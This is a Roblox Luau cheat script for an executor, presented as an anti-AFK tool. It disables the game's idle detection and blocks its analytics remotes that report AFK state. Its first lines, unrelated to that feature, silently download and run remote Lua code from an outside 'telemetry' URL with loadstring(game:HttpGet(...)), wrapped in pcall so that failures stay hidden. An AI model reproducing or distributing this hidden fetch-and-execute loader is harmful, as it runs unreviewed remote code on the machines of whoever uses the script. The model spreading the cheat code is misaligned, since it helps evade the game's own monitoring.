task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a913e68c47ec8d528fedc83"))()
	end)
end)

local function StartAntiAfk()
    if _G.DecodeAPI.AntiAfkLoopActive then return end
    _G.DecodeAPI.AntiAfkLoopActive = true
    
    if _G.PostMailboxTerminalAlert then
        _G.PostMailboxTerminalAlert("AntiAFK", "Anti-AFK Active", false)
    end

    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local RunService = game:GetService("RunService")
    local Player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

    local idleEvent = Player:FindFirstChild("Idled")
    if idleEvent then
        for _, conn in pairs(getconnections(idleEvent)) do
            pcall(function() conn:Disable() end)
        end
    end

    local Network = ReplicatedStorage:WaitForChild("Network", 10)
    local targets = {
        "Analytics:ReportAfkState",
        "Analytics:ReportAfkTeleport", 
        "Analytics:RequestAfkTeleportFlush"
    }

    local function blockRemote(name)
        local remote = Network and Network:FindFirstChild(name)
        if not remote then return end
        
        if remote:IsA("RemoteEvent") then
            for _, conn in ipairs(getconnections(remote.OnClientEvent)) do
                pcall(function() conn:Disable() end)
            end
        elseif remote:IsA("RemoteFunction") then
            remote.OnClientInvoke = function(...)
                return nil
            end
        end
    end

    for _, name in ipairs(targets) do
        blockRemote(name)
        if Network then
            task.spawn(function()
                local r = Network:WaitForChild(name, 20)
                if r then blockRemote(name) end
            end)
        end
    end

    task.spawn(function()
        while _G.DecodeAPI.AntiAfkLoopActive do
            local configs = _G.DecodeAPI.Configs
            if configs and configs.AntiAfkToggleState then
                for _, name in ipairs(targets) do
                    blockRemote(name)
                end
            end
            task.wait(10)
        end
    end)

    local cam = workspace.CurrentCamera
    local tick = 0
    local renderConnection
    
    renderConnection = RunService.RenderStepped:Connect(function(dt)
        if not _G.DecodeAPI.AntiAfkLoopActive then
            if renderConnection then renderConnection:Disconnect() end
            return
        end

        local configs = _G.DecodeAPI.Configs
        if configs and configs.AntiAfkToggleState and cam and Player.Character and Player.Character:FindFirstChild("Humanoid") then
            tick = tick + dt
            if tick > 30 then
                tick = 0
                local c = cam.CFrame
                cam.CFrame = c * CFrame.fromEulerAnglesXYZ(0, math.rad(0.05), 0)
                task.wait(0.1)
                cam.CFrame = c
            end
        end
    end)

    task.spawn(function()
        while _G.DecodeAPI.AntiAfkLoopActive do
            local configs = _G.DecodeAPI.Configs
            if configs and not configs.AntiAfkToggleState then
                _G.DecodeAPI.AntiAfkLoopActive = false
            end
            task.wait(1)
        end
        
        if _G.PostMailboxTerminalAlert then
            _G.PostMailboxTerminalAlert("AntiAFK", "Anti-AFK Disabled", false)
        end
    end)
end
StartAntiAfk()
